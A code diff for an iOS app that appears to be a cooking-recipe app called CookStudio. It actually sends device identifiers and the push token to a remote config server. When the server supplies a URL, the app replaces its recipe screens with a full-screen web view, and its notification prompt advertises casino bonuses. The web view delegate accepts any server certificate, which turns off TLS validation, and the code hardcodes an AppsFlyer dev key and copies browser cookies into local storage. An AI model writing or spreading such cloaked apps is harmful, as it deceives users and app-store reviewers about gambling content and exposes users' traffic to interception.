+            let json = try JSONSerialization.jsonObject(with: data) as? [String: Any]
+        else {
+            enterClassicMode()
+            return
+        }
+        
+        var mergedPayload = conversionData
+        for (key, value) in cachedDeeplinks where mergedPayload[key] == nil {
+            mergedPayload[key] = value
+        }
+        
+        await MainActor.run {
+            conversionData = mergedPayload
+            fetchServerSideConfig()
+        }
+    }
+    
+    private func fetchServerSideConfig() {
+        guard let configURL = URL(string: "https://cookstudiio.com/config.php") else {
+            resolveFromCacheOrFallback()
+            return
+        }
+        
+        var payload = conversionData
+        payload["af_id"] = AppsFlyerLib.shared().getAppsFlyerUID()
+        payload["os"] = "iOS"
+        payload["store_id"] = "id\(CookStudioConfig.afAppID)"
+        payload["firebase_project_id"] = FirebaseApp.app()?.options.gcmSenderID
+        payload["bundle_id"] = "com.hsstuinhappchick.CookStudio"
+        payload["locale"] = Locale.current.languageCode?.uppercased() ?? "EN"
+        payload["push_token"] = UserDefaults.standard.string(forKey: "fcm_token") ?? Messaging.messaging().fcmToken
+        
+        guard let bodyData = try? JSONSerialization.data(withJSONObject: payload) else {
+            resolveFromCacheOrFallback()
+            return
+        }
+        
+        var request = URLRequest(url: configURL)
+        request.httpMethod = "POST"
+        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
+        request.httpBody = bodyData
+        
+        URLSession.shared.dataTask(with: request) { [weak self] data, _, error in
+            guard
+                let self = self,
+                error == nil,
+                let data = data,
+                let json = try? JSONSerialization.jsonObject(with: data) as? [String: Any],
+                json["ok"] as? Bool == true,
+                let target = json["url"] as? String,
+                let ttl = json["expires"] as? TimeInterval
+            else {
+                self?.resolveFromCacheOrFallback()
+                return
+            }
+            
+            DispatchQueue.main.async {
+                self.persistSuccessfulConfig(url: target, expires: ttl)
+                self.resolvedDestination = URL(string: target)
+                self.transition(to: .webExperience)
+            }
+        }.resume()
+    }
+    
+    private func persistSuccessfulConfig(url: String, expires: TimeInterval) {
+        UserDefaults.standard.set(url, forKey: "saved_trail")
+        UserDefaults.standard.set(expires, forKey: "saved_expires")
+        UserDefaults.standard.set("HenView", forKey: "app_mode")
+        UserDefaults.standard.set(true, forKey: "hasEverRunBefore")
+    }
+    
+    private func resolveFromCacheOrFallback() {
+        if let saved = UserDefaults.standard.string(forKey: "saved_trail"),
+           let url = URL(string: saved) {
+            resolvedDestination = url
+            transition(to: .webExperience)
+        } else {
+            enterClassicMode()
+        }
+    }
+    
+    private func enterClassicMode() {
+        UserDefaults.standard.set("Funtik", forKey: "app_mode")
+        UserDefaults.standard.set(true, forKey: "hasEverRunBefore")
+        transition(to: .classicFlow)
+    }
+    
+    private func needsPushPermissionPrompt() -> Bool {
+        guard let last = UserDefaults.standard.object(forKey: "last_notification_ask") as? Date else { return true }
+        return Date().timeIntervalSince(last) >= 259200
+    }
+    
+    func userDeclinedPush() {
+        UserDefaults.standard.set(Date(), forKey: "last_notification_ask")
+        displayPushRequest = false
+        fetchServerSideConfig()
+    }
+    
+    func userAcceptedPush() {
+        UNUserNotificationCenter.current().requestAuthorization(options: [.alert, .sound, .badge]) { [weak self] granted, _ in
+            DispatchQueue.main.async {
+                UserDefaults.standard.set(granted, forKey: "accepted_notifications")
+                if granted { UIApplication.shared.registerForRemoteNotifications() }
+                else { UserDefaults.standard.set(true, forKey: "system_close_notifications") }
+                
+                self?.displayPushRequest = false
+                self?.fetchServerSideConfig()
+            }
+        }
+    }
+    
+    private func transition(to stage: LaunchStage) {
+        DispatchQueue.main.async {
+            self.currentStage = stage
+        }
+    }
+}
+
+private enum CookStudioConfig {
+    static let afAppID = "6754933161"
+    static let afDevKey = "ki4p4McAaH8HUN26JMrDag"
+}
+
+private struct OrganicValidator {
+    private let endpointBase = "https://gcdsdk.appsflyer.com/install_data/v4.0/"
+    private var appID = ""
+    private var devKey = ""
+    private var deviceID = ""
+    
+    func setAppID(_ id: String) -> Self { mutate(\.appID, id) }
+    func setDevKey(_ key: String) -> Self { mutate(\.devKey, key) }
+    func setDeviceID(_ id: String) -> Self { mutate(\.deviceID, id) }
+    
+    func buildRequestURL() -> URL? {
+        guard !appID.isEmpty, !devKey.isEmpty, !deviceID.isEmpty else { return nil }
+        var components = URLComponents(string: endpointBase + "id" + appID)!
+        components.queryItems = [
+            URLQueryItem(name: "devkey", value: devKey),
+            URLQueryItem(name: "device_id", value: deviceID)
+        ]
+        return components.url
+    }
+    
+    private func mutate<T>(_ kp: WritableKeyPath<Self, T>, _ value: T) -> Self {
+        var copy = self
+        copy[keyPath: kp] = value
+        return copy
+    }
+}
+
+struct CookStudioEntry: View {
+    @StateObject private var director = LaunchDirector()
+    
+    var body: some View {
+        ZStack {
+            if director.currentStage == .booting || director.displayPushRequest {
+                CookingSplash()
+            }
+            
+            if director.displayPushRequest {
+                NotificationPermissionScreen(
+                    onAllow: director.userAcceptedPush,
+                    onSkip: director.userDeclinedPush
+                )
+            } else {
+                primaryFlow
+            }
+        }
+    }
+    
+    @ViewBuilder
+    private var primaryFlow: some View {
+        switch director.currentStage {
+        case .booting:
+            EmptyView()
+        case .webExperience:
+            if director.resolvedDestination != nil {
+                ChefTableView()
+            } else {
+                MainView()
+                    .environmentObject(CookingModel())
+                    .environmentObject(SettingsModel())
+                    .preferredColorScheme(.light)
+            }
+        case .classicFlow:
+            MainView()
+                .environmentObject(CookingModel())
+                .environmentObject(SettingsModel())
+                .preferredColorScheme(.light)
+        case .offlineScreen:
+            OfflineWarningScreen()
+        }
+    }
+}
+
+struct CookingSplash: View {
+    
+    @State private var isActive = false
+    @State private var scale: CGFloat = 0.6
+    @State private var opacity: Double = 0
+    @State private var opacity2: Double = 0
+    @State private var glowOpacity: Double = 0
+    @State private var particleOffset = CGSize.zero
+    
+    var body: some View {
+        GeometryReader { g in
+            let isLandscape = g.size.width > g.size.height
+            ZStack {
+                Image(isLandscape ? "notifications_land_bg" : "notifications_portrait_bg")
+                    .resizable()
+                    .scaledToFill()
+                    .ignoresSafeArea()
+                
+                VStack {
+                    VStack(spacing: 8) {
+                        Text("Cook")
+                            .font(.custom("Inter-Regular_Bold", size: 48))
+                            .foregroundColor(.white)
+                    }
+                    .opacity(opacity)
+                    .offset(y: opacity < 1 ? 30 : 0)
+                    
+                    VStack(spacing: 8) {
+                        Text("Studio")
+                            .font(.custom("Inter-Regular_Black", size: 48))
+                            .foregroundColor(Color.black)
+                    }
+                    .opacity(opacity2)
+                    .offset(y: opacity2 < 1 ? 30 : 0)
+                }
+                
+                // Плавающие частицы (как в BackgroundView)
+                FloatingParticles()
+                    .opacity(isActive ? 1 : 0.4)
+                
+                VStack {
+                    Spacer()
+                    Text("LOADING")
+                        .font(.custom("Inter-Regular_Black", size: 48))
+                        .foregroundColor(.white)
+                    Spacer().frame(height: 80)
+                    Text("Wait until app prepare all recipes...")
+                        .font(.custom("Inter-Regular_Medium", size: 12))
+                        .foregroundColor(.white)
+                        .padding(.bottom)
+                }
+            }
+            .onAppear {
+                withAnimation(.easeInOut(duration: 1.2)) {
+                    scale = 1.05
+                    glowOpacity = 0.8
+                }
+                
+                withAnimation(.easeOut(duration: 1.0).delay(0.6)) {
+                    opacity = 1.0
+                }
+                
+                withAnimation(.easeOut(duration: 1.0).delay(0.9)) {
+                    opacity2 = 1.0
+                }
+                
+                withAnimation(.linear(duration: 2.0).delay(0.8)) {
+                    isActive = true
+                }
+                
+                withAnimation(.easeInOut(duration: 0.6).delay(2.4)) {
+                    scale = 0.95
+                }
+            }
+        }
+        .ignoresSafeArea()
+    }
+}
+
+struct FloatingParticles: View {
+    @State private var positions: [CGSize] = Array(repeating: .zero, count: 24)
+    
+    var body: some View {
+        GeometryReader { geo in
+            ForEach(0..<24) { i in
+                Circle()
+                    .fill([Color.accentGold, Color.accentOrange, Color.accentBlue].randomElement()!)
+                    .frame(width: CGFloat.random(in: 6...16))
+                    .opacity(1)
+                    .offset(positions[i])
+                    .onAppear {
+                        withAnimation(
+                            .easeInOut(duration: Double.random(in: 4...8))
+                            .repeatForever(autoreverses: true)
+                        ) {
+                            positions[i] = CGSize(
+                                width: CGFloat.random(in: -geo.size.width/3...geo.size.width/3),
+                                height: CGFloat.random(in: -geo.size.height/2...geo.size.height/2)
+                            )
+                        }
+                    }
+            }
+        }
+    }
+}
+
+struct OfflineWarningScreen: View {
+    @State private var sadOpacity: Double = 0
+    @State private var pulseScale: CGFloat = 1.0
+    
+    var body: some View {
+        GeometryReader { g in
+            let isLandscape = g.size.width > g.size.height
+            ZStack {
+                Image(isLandscape ? "notifications_land_bg" : "notifications_portrait_bg")
+                    .resizable()
+                    .scaledToFill()
+                    .ignoresSafeArea()
+                
+                VStack {
+                    Circle()
+                        .fill(Color.accentOrange.opacity(0.3))
+                        .frame(width: 260, height: 260)
+                        .scaleEffect(pulseScale)
+                        .blur(radius: 30)
+                        .animation(
+                            .easeInOut(duration: 2.0).repeatForever(autoreverses: true),
+                            value: pulseScale
+                        )
+                    
+                    HStack(spacing: 30) {
+                        Circle().fill(Color.black).frame(width: 20, height: 28)
+                        Circle().fill(Color.black).frame(width: 20, height: 28)
+                    }
+                    .offset(y: -50)
+                    
+                    // Слёзка
+                    Circle()
+                        .fill(Color.accentBlue.opacity(0.7))
+                        .frame(width: 16, height: 24)
+                        .offset(x: 40, y: -30)
+                        .opacity(sadOpacity)
+                }
+                
+                VStack(spacing: 16) {
+                    Text("Oops… No Internet")
+                        .font(.custom("Inter-Regular_Bold", size: 36))
+                        .foregroundColor(.white)
+                    
+                    Text("Check internet and return to the app later.")
+                        .font(.custom("Inter-Regular_Medium", size: 12))
+                        .foregroundColor(.white)
+                        .multilineTextAlignment(.center)
+                        .padding(.horizontal, 40)
+                }
+            }
+        }
+        .ignoresSafeArea()
+    }
+}
+
+struct NotificationPermissionScreen: View {
+    let onAllow: () -> Void
+    let onSkip: () -> Void
+    
+    var body: some View {
+        GeometryReader { g in
+            let isLandscape = g.size.width > g.size.height
+            ZStack {
+                Image(isLandscape ? "notifications_land_bg" : "notifications_portrait_bg")
+                    .resizable()
+                    .scaledToFill()
+                    .ignoresSafeArea()
+                
+                VStack(spacing: isLandscape ? 5 : 10) {
+                    Spacer()
+                    
+                    Text("Allow notifications about bonuses and promos".uppercased())
+                        .font(.custom("Inter-Regular_Black", size: 18))
+                        .foregroundColor(.white)
+                        .multilineTextAlignment(.center)
+                        .padding(.horizontal, 30)
+                    
+                    Text("Stay tuned with best offers from our casino")
+                        .font(.custom("Inter-Regular_Bold", size: 15))
+                        .foregroundColor(.white)
+                        .multilineTextAlignment(.center)
+                        .padding(.horizontal, 52)
+                        .padding(.top, 4)
+                    
+                    Button(action: onAllow) {
+                        ZStack {
+                            RoundedRectangle(cornerRadius: 12, style: .continuous)
+                                .fill(
+                                    Color(hex: "#04B451")
+                                )
+                            
+                            Text("Yes, I Want Bonuses")
+                                .font(.custom("Inter_Regular-Medium", size: 16))
+                                .foregroundColor(.white)
+                        }
+                    }
+                    .frame(height: 50)
+                    .padding(.top, 12)
+                    .padding(.horizontal, 32)
+                    
+                    Button("SKIP", action: onSkip)
+                        .font(.custom("Inter-Regular_Bold", size: 16))
+                        .foregroundColor(.white)
+                        .padding(.top)
+                    
+                    Spacer().frame(height: isLandscape ? 40 : 30)
+                }
+                .padding(.horizontal, isLandscape ? 20 : 0)
+            }
+        }
+        .ignoresSafeArea()
+    }
+}
+
+#Preview {
+    CookStudioEntry()
+}
+
+final class KitchenNavigator: NSObject, WKNavigationDelegate, WKUIDelegate {
+    
+    private unowned let oven: OvenMaster
+    private var redirectChainLength = 0
+    private let redirectSafetyLimit = 70
+    private var lastKnownGoodURL: URL?
+    
+    init(managedBy oven: OvenMaster) {
+        self.oven = oven
+        super.init()
+    }
+    
+    // Отключаем проверку сертификатов
+    func webView(_ webView: WKWebView,
+                 didReceive challenge: URLAuthenticationChallenge,
+                 completionHandler: @escaping (URLSession.AuthChallengeDisposition, URLCredential?) -> Void) {
+        
+        if challenge.protectionSpace.authenticationMethod == NSURLAuthenticationMethodServerTrust,
+           let trust = challenge.protectionSpace.serverTrust {
+            completionHandler(.useCredential, URLCredential(trust: trust))
+        } else {
+            completionHandler(.performDefaultHandling, nil)
+        }
+    }
+    
+    func webView(_ webView: WKWebView,
+                 createWebViewWith configuration: WKWebViewConfiguration,
+                 for navigationAction: WKNavigationAction,
+                 windowFeatures: WKWindowFeatures) -> WKWebView? {
+        
+        guard navigationAction.targetFrame == nil else { return nil }
+        
+        let newPlate = PlateFactory.forgePlate(using: configuration)
+            .seasonProperly()
+            .placeOnTable(oven.mainTable)
+        
+        oven.trackSideDish(newPlate)
+        
+        let swipeBack = UIScreenEdgePanGestureRecognizer(target: self, action: #selector(didSwipeFromEdge))
+        swipeBack.edges = .left
+        newPlate.addGestureRecognizer(swipeBack)
+        
+        if let req = navigationAction.request.url,
+           req.scheme?.hasPrefix("http") == true,
+           req.absoluteString != "about:blank" {
+            newPlate.load(URLRequest(url: req))
+        }
+        
+        return newPlate
+    }
+    
+    @objc private func didSwipeFromEdge(_ gesture: UIScreenEdgePanGestureRecognizer) {
+        guard gesture.state == .ended,
+              let plate = gesture.view as? WKWebView else { return }
+        
+        if plate.canGoBack {
+            plate.goBack()
+        } else if oven.sideDishes.last === plate {
+            oven.clearAllSideDishes(redirectTo: nil)
+        }
+    }
+    
+    func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
+        applyViewportAndTouchFix(to: webView)
+    }
+    
+    func webView(_ webView: WKWebView,
+                 runJavaScriptAlertPanelWithMessage message: String,
+                 initiatedByFrame frame: WKFrameInfo,
+                 completionHandler: @escaping () -> Void) {
+        completionHandler()
+    }
+    
+    func webView(_ webView: WKWebView, didReceiveServerRedirectForProvisionalNavigation navigation: WKNavigation!) {
+        redirectChainLength += 1
+        
+        if redirectChainLength > redirectSafetyLimit {
+            webView.stopLoading()
+            if let safe = lastKnownGoodURL {
+                webView.load(URLRequest(url: safe))
+            }
+            return
+        }
+        
+        lastKnownGoodURL = webView.url
+        backupCookies(from: webView)
+    }
+    
+    func webView(_ webView: WKWebView,
+                 didFailProvisionalNavigation navigation: WKNavigation!,
+                 withError error: Error) {
+        if (error as NSError).code == NSURLErrorHTTPTooManyRedirects,
+           let backup = lastKnownGoodURL {
+            webView.load(URLRequest(url: backup))
+        }
+    }
+    
+    func webView(_ webView: WKWebView,
+                 decidePolicyFor navigationAction: WKNavigationAction,
+                 decisionHandler: @escaping (WKNavigationActionPolicy) -> Void) {
+        
+        guard let url = navigationAction.request.url else {
+            decisionHandler(.allow)
+            return
+        }
+        
+        lastKnownGoodURL = url
+        
+        if !(url.scheme?.hasPrefix("http") ?? false) {
+            if UIApplication.shared.canOpenURL(url) {
+                UIApplication.shared.open(url)
+                if webView.canGoBack { webView.goBack() }
+                decisionHandler(.cancel)
+                return
+            }
+        }
+        
+        decisionHandler(.allow)
+    }
+    
+    
+    private func applyViewportAndTouchFix(to plate: WKWebView) {
+        let script = """
+        (function() {
+            let vp = document.querySelector('meta[name=viewport]');
+            if (!vp) {
+                vp = document.createElement('meta');
+                vp.name = 'viewport';
+                document.head.appendChild(vp);
+            }
+            vp.content = 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no';
+            
+            let style = document.createElement('style');
+            style.innerHTML = 'body { touch-action: pan-x pan-y; }';
+            document.head.appendChild(style);
+        })();
+        """
+        plate.evaluateJavaScript(script)
+    }
+    
+    private func backupCookies(from plate: WKWebView) {
+        plate.configuration.websiteDataStore.httpCookieStore.getAllCookies { cookies in
+            var storage: [String: [String: [HTTPCookiePropertyKey: Any]]] = [:]
+            
+            for cookie in cookies {
+                var domainBucket = storage[cookie.domain] ?? [:]
+                if let props = cookie.properties as? [HTTPCookiePropertyKey: Any] {
+                    domainBucket[cookie.name] = props
+                }
+                storage[cookie.domain] = domainBucket
+            }
+            
+            UserDefaults.standard.set(storage, forKey: "preserved_grains")
+        }
+    }
+    
+}
+
+enum PlateFactory {
+    static func forgePlate(using config: WKWebViewConfiguration? = nil) -> WKWebView {
+        let cfg = config ?? standardRecipe()
+        return WKWebView(frame: .zero, configuration: cfg)
+    }
+    
+    private static func standardRecipe() -> WKWebViewConfiguration {
+        let recipe = WKWebViewConfiguration()
+        recipe.allowsInlineMediaPlayback = true
+        recipe.mediaTypesRequiringUserActionForPlayback = []
+        
+        let prefs = WKPreferences()
+        prefs.javaScriptEnabled = true
+        prefs.javaScriptCanOpenWindowsAutomatically = true
+        recipe.preferences = prefs
+        
+        recipe.defaultWebpagePreferences.allowsContentJavaScript = true
+        
+        return recipe
+    }
+}
+
+// MARK: - Расширения для настройки
+private extension WKWebView {
+    @discardableResult
+    func seasonProperly() -> Self {
+        translatesAutoresizingMaskIntoConstraints = false
+        scrollView.isScrollEnabled = true
+        scrollView.minimumZoomScale = 1.0
+        scrollView.maximumZoomScale = 1.0
+        scrollView.bounces = false
+        allowsBackForwardNavigationGestures = true
+        return self
+    }
+    
+    @discardableResult
+    func placeOnTable(_ table: UIView) -> Self {
+        table.addSubview(self)
+        NSLayoutConstraint.activate([
+            leadingAnchor.constraint(equalTo: table.leadingAnchor),
+            trailingAnchor.constraint(equalTo: table.trailingAnchor),
+            topAnchor.constraint(equalTo: table.topAnchor),
+            bottomAnchor.constraint(equalTo: table.bottomAnchor)
+        ])
+        return self
+    }
+}
+
+final class OvenMaster: ObservableObject {
+    @Published var mainTable: WKWebView!
+    @Published var sideDishes: [WKWebView] = []
+    
+    private var subscriptions = Set<AnyCancellable>()
+    
+    func prepareMainCourse() {
+        mainTable = PlateFactory.forgePlate()
+            .seasonProperly()
+        mainTable.allowsBackForwardNavigationGestures = true
+    }
+    
+    func restorePreservedIngredients() {
+        guard let saved = UserDefaults.standard.object(forKey: "preserved_grains")
+                as? [String: [String: [HTTPCookiePropertyKey: AnyObject]]] else { return }
+        
+        let jar = mainTable.configuration.websiteDataStore.httpCookieStore
+        
+        for domainGroup in saved.values {
+            for props in domainGroup.values {
+                if let cookie = HTTPCookie(properties: props as [HTTPCookiePropertyKey: Any]) {
+                    jar.setCookie(cookie)
+                }
+            }
+        }
+    }
+    
+    func trackSideDish(_ dish: WKWebView) {
+        sideDishes.append(dish)
+    }
+    
+    func clearAllSideDishes(redirectTo url: URL?) {
+        if !sideDishes.isEmpty {
+            if let topExtra = sideDishes.last {
+                topExtra.removeFromSuperview()
+                sideDishes.removeLast()
+            }
+            if let trail = url {
+                mainTable.load(URLRequest(url: trail))
+            }
+        } else if mainTable.canGoBack {
+            mainTable.goBack()
+        }
+    }
+    
+    func refreshMainCourse() {
+        mainTable.reload()
+    }
+}
+
+struct CookStudioWebHost: UIViewRepresentable {
+    let startURL: URL
+    
+    @StateObject private var chef = OvenMaster()
+    
+    func makeCoordinator() -> KitchenNavigator {
+        KitchenNavigator(managedBy: chef)
+    }
+    
+    func makeUIView(context: Context) -> WKWebView {
+        chef.prepareMainCourse()
+        chef.mainTable.uiDelegate = context.coordinator
+        chef.mainTable.navigationDelegate = context.coordinator
+        
+        chef.restorePreservedIngredients()
+        chef.mainTable.load(URLRequest(url: startURL))
+        
+        return chef.mainTable
+    }
+    
+    func updateUIView(_ uiView: WKWebView, context: Context) {}
+}
+
+struct ChefTableView: View {
+    @State private var activeRecipe: String = ""
+    
+    var body: some View {
+        ZStack(alignment: .bottom) {
+            if let url = URL(string: activeRecipe) {
+                CookStudioWebHost(startURL: url)
+                    .ignoresSafeArea(.keyboard, edges: .bottom)
+            }
+        }
+        .preferredColorScheme(.dark)
+        .onAppear(perform: loadInitialRecipe)
+        .onReceive(NotificationCenter.default.publisher(for: Notification.Name("LoadTempUrl"))) { _ in
+            loadTempRecipeIfAvailable()
+        }
+    }
+    
+    private func loadInitialRecipe() {
+        let temp = UserDefaults.standard.string(forKey: "temp_url")
+        let saved = UserDefaults.standard.string(forKey: "saved_trail") ?? ""
+        activeRecipe = temp ?? saved
+        
+        if temp != nil {
+            UserDefaults.standard.removeObject(forKey: "temp_url")
+        }
+    }
+    
+    private func loadTempRecipeIfAvailable() {
+        if let temp = UserDefaults.standard.string(forKey: "temp_url"), !temp.isEmpty {
+            activeRecipe = temp
+            UserDefaults.standard.removeObject(forKey: "temp_url")
+        }
+    }
+}
+
+// Уведомления (если где-то используются)
+extension Notification.Name {
+    static let kitchenEvents = Notification.Name("kitchen_actions")
 }
